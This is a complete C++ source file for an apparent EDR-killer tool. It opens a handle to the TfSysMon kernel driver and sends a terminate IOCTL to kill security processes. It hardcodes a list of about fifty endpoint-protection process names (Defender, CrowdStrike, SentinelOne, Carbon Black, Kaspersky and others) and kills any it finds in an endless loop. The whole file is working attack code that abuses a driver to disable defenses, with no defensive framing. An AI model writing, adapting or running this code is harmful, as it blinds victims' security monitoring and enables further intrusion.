// tfsysmon.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <signal.h>

#define DRIVER_NAME L"tfsysmon"
#define IOCTL_CODE 0xB4A00404

const wchar_t* edrNames[] = { L"MsMpEng.exe", L"SecurityHealthService.exe", L"SecurityHealthSystray.exe", L"MsSense.exe", L"SenseNdr.exe", L"SenseTVM.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpSigStub.exe", L"ConfigSecurityPolicy.exe", L"smartscreen.exe", L"CSFalconService.exe", L"CSFalconContainer.exe", L"CSAgent.exe", L"falcon-sensor.exe", L"SentinelAgent.exe", L"SentinelAgentWorker.exe", L"SentinelServiceHost.exe", L"SentinelStaticEngine.exe", L"cb.exe", L"cbstream.exe", L"carbonblack.exe", L"RepMgr.exe", L"RepUtils.exe", L"RepUx.exe", L"ccSvcHst.exe", L"SymCorpUI.exe", L"SEPM.exe", L"SmcGui.exe", L"smc.exe", L"ccApp.exe", L"McShield.exe", L"mfevtps.exe", L"mfeann.exe", L"mcapexe.exe", L"ModuleCoreService.exe", L"mfemms.exe", L"PccNTMon.exe", L"ntrtscan.exe", L"tmlisten.exe", L"CNTAoSMgr.exe", L"TmCCSF.exe", L"avp.exe", L"kavtray.exe", L"klnagent.exe", L"ksde.exe", L"cytray.exe", L"cyserver.exe", L"CyveraService.exe", L"xagt.exe", L"fe_avk.exe", L"HX.exe" };

const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

typedef struct _TERMINATE_STRUCTURE {
    BYTE PADDING1[0x4];
    DWORD PID;
    BYTE PADDING2[0x10];
} TERMINATE_STRUCTURE, * PTERMINATE_STRUCTURE;

// Function to find the PID of a process by its name
DWORD FindEDR(const wchar_t* processName) {
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD processId = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return NULL;
    }
    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            processId = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);

    return processId;
}

int wmain(int argc, wchar_t* argv[])
{

    printf("[+] Opening handle to device..\n");
    HANDLE hDriver = CreateFileW(
        L"\\\\.\\TfSysMon",
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    TERMINATE_STRUCTURE input = { 0 };

    while (true) {
        for (size_t i = 0; i < edrCount; i++) {

            // Find EDR PID
            DWORD EDRPID = 0;
            EDRPID = FindEDR(edrNames[i]);

            if (EDRPID != 0) {

                input.PID = EDRPID;
                wprintf(L"[+] Calling ProcessTerminator to Kill %ls with PID: %d....", edrNames[i], EDRPID);

                // Terminate EDR
                NTSTATUS success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    &input,
                    sizeof(input),
                    nullptr,
                    0,
                    nullptr,
                    nullptr);

                if (success) {
                    printf("success\n");
                }
                else {
                    printf("failed\n");
                }
            }

        }

        Sleep(1000);
    }

    CloseHandle(hDriver);

    return 0;
}